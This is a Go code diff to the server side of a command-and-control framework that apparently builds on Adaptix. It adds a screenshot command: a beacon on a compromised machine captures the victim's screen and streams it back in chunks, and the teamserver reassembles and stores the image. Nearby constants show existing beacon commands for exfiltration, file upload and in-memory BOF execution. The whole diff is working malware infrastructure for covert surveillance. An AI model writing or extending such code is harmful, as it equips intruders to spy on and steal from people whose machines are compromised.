@@ -28,6 +28,7 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/Adaptix-Framework/axc2"
@@ -70,9 +71,16 @@ type Teamserver interface {
 	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
 	TsDownloadUpdate(fileId string, state int, data []byte) error
 	TsDownloadClose(fileId string, reason int) error
+	TsScreenshotAdd(agentId string, Note string, Content []byte) error
 }
 
 var Ts Teamserver
+
+// Screenshot reassembly: the BMP streams across many POSTs (the beacon
+// drains its heap buffer 48 KiB per cycle); chunks accumulate by task id
+// until the FINISH record hands the full image to TsScreenshotAdd.
+var screenshotRecon = make(map[uint]*bytes.Buffer)
+var screenshotMutex sync.Mutex
 
 // RC4Crypt: the session cipher (Encrypt == Decrypt == RC4, docs/WIRE.md) —
 // same cipher, same keystream, as the beacon's specter_core::rc4.
@@ -178,7 +186,15 @@ const (
 	COMMAND_UPLOAD     = 33
 	COMMAND_EXFIL      = 35
 	COMMAND_SAVEMEMORY = 0x2321
-	COMMAND_ERROR     = 0x1111ffff
+	COMMAND_ERROR      = 0x1111ffff
+
+	// Screenshot (free id in the native numbering): the beacon captures the
+	// screen into a heap BMP and streams it across cycles like a download;
+	// the server reassembles by task id and hands the BMP to TsScreenshotAdd.
+	COMMAND_SCREENSHOT  = 44
+	SCREENSHOT_START    = 0x1
+	SCREENSHOT_CONTINUE = 0x2
+	SCREENSHOT_FINISH   = 0x3
 
 	// BOF execution (native pl_utils.go).
 	COMMAND_EXEC_BOF     = 50
@@ -821,6 +837,9 @@ func (e *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[stri
 
 	case "disks":
 		array = []interface{}{COMMAND_DISKS}
+
+	case "screenshot":
+		array = []interface{}{COMMAND_SCREENSHOT}
 
 	case "ps":
 		if subcommand == "list" {
@@ -1496,6 +1515,48 @@ func (e *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData [
 			} else if downloadCommand == DOWNLOAD_FINISH {
 				task.Message = fmt.Sprintf("File download complete: [fid %v]", fileId)
 				_ = Ts.TsDownloadClose(fileId, adaptix.DOWNLOAD_STATE_FINISHED)
+			}
+
+		case COMMAND_SCREENSHOT:
+			if false == packer.CheckPacker([]string{"byte"}) {
+				goto HANDLER
+			}
+			shotState := packer.ParseInt8()
+			if shotState == SCREENSHOT_START {
+				if false == packer.CheckPacker([]string{"long"}) {
+					goto HANDLER
+				}
+				shotSize := packer.ParseInt64()
+				task.Message = fmt.Sprintf("Screenshot capture started (%v bytes)", shotSize)
+				task.Completed = false
+
+				screenshotMutex.Lock()
+				screenshotRecon[TaskId] = bytes.NewBuffer(make([]byte, 0, shotSize))
+				screenshotMutex.Unlock()
+
+			} else if shotState == SCREENSHOT_CONTINUE {
+				if false == packer.CheckPacker([]string{"array"}) {
+					goto HANDLER
+				}
+				chunk := packer.ParseBytes()
+
+				screenshotMutex.Lock()
+				if buf, ok := screenshotRecon[TaskId]; ok {
+					buf.Write(chunk)
+				}
+				screenshotMutex.Unlock()
+				continue
+
+			} else if shotState == SCREENSHOT_FINISH {
+				screenshotMutex.Lock()
+				buf := screenshotRecon[TaskId]
+				delete(screenshotRecon, TaskId)
+				screenshotMutex.Unlock()
+
+				task.Message = "Screenshot captured"
+				if buf != nil && Ts != nil {
+					_ = Ts.TsScreenshotAdd(agentData.Id, "", buf.Bytes())
+				}
 			}
 
 		case COMMAND_EXFIL:
